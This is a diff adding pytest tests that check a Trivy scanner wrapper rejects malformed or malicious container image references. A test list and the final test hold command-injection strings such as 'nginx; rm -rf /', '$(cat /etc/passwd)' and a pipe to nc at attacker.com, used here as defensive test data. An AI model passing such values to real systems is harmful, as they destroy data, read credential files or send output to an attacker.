@@ -357,3 +357,99 @@ class TestTrivyOutputParsing:
         vuln = result.vulnerabilities[0]
         assert len(vuln.references) == 2
         assert "nvd.nist.gov" in vuln.references[0]
+
+
+class TestImageReferenceValidation:
+    """Tests for image reference validation security checks."""
+
+    def test_valid_image_references(self):
+        """Test that valid image references pass validation."""
+        scanner = TrivyScanner()
+        valid_refs = [
+            "nginx:latest",
+            "python:3.11",
+            "gcr.io/project/image:v1.0",
+            "docker.io/library/alpine:3.19",
+            "registry.example.com:5000/my-image:tag",
+            "image@sha256:abcdef1234567890",
+            "my-registry/my-image:1.2.3-alpha",
+            "ghcr.io/org/repo:feature-branch",
+            "a",  # Single character is valid
+        ]
+        for ref in valid_refs:
+            # Should not raise
+            scanner._validate_image_reference(ref)
+
+    def test_empty_image_reference(self):
+        """Test that empty image reference is rejected."""
+        scanner = TrivyScanner()
+        with pytest.raises(ValueError, match="cannot be empty"):
+            scanner._validate_image_reference("")
+
+    def test_null_byte_in_reference(self):
+        """Test that null bytes in image reference are rejected."""
+        scanner = TrivyScanner()
+        with pytest.raises(ValueError, match="invalid characters"):
+            scanner._validate_image_reference("nginx:latest\x00malicious")
+
+    def test_newline_in_reference(self):
+        """Test that newlines in image reference are rejected."""
+        scanner = TrivyScanner()
+        with pytest.raises(ValueError, match="invalid characters"):
+            scanner._validate_image_reference("nginx:latest\nmalicious")
+        with pytest.raises(ValueError, match="invalid characters"):
+            scanner._validate_image_reference("nginx:latest\rmalicious")
+
+    def test_too_long_reference(self):
+        """Test that overly long image references are rejected."""
+        scanner = TrivyScanner()
+        long_ref = "a" * 513
+        with pytest.raises(ValueError, match="exceeds maximum length"):
+            scanner._validate_image_reference(long_ref)
+
+    def test_shell_metacharacters_rejected(self):
+        """Test that shell metacharacters are rejected."""
+        scanner = TrivyScanner()
+        malicious_refs = [
+            "nginx; rm -rf /",
+            "nginx && cat /etc/passwd",
+            "nginx | nc attacker.com 1234",
+            "nginx`whoami`",
+            "$(cat /etc/passwd)",
+            "nginx > /tmp/output",
+            "nginx < /etc/passwd",
+            "nginx*",
+            "nginx?tag",
+            "nginx[1]",
+            "nginx{a,b}",
+            "nginx!test",
+            "nginx$HOME",
+            "nginx 'quoted'",
+            'nginx "double quoted"',
+        ]
+        for ref in malicious_refs:
+            with pytest.raises(ValueError, match="Invalid image reference"):
+                scanner._validate_image_reference(ref)
+
+    def test_reference_starting_with_special_char(self):
+        """Test that references not starting with alphanumeric are rejected."""
+        scanner = TrivyScanner()
+        with pytest.raises(ValueError, match="Invalid image reference"):
+            scanner._validate_image_reference("-nginx:latest")
+        with pytest.raises(ValueError, match="Invalid image reference"):
+            scanner._validate_image_reference(".nginx:latest")
+        with pytest.raises(ValueError, match="Invalid image reference"):
+            scanner._validate_image_reference("_nginx:latest")
+
+    @patch("stance.scanner.trivy.shutil.which")
+    def test_scan_validates_input(self, mock_which):
+        """Test that scan method validates image reference before processing."""
+        mock_which.return_value = "/usr/local/bin/trivy"
+        scanner = TrivyScanner()
+
+        # Should raise ValueError before even trying to run subprocess
+        with pytest.raises(ValueError, match="invalid characters"):
+            scanner.scan("nginx:latest\nmalicious")
+
+        with pytest.raises(ValueError, match="Invalid image reference"):
+            scanner.scan("nginx; rm -rf /")
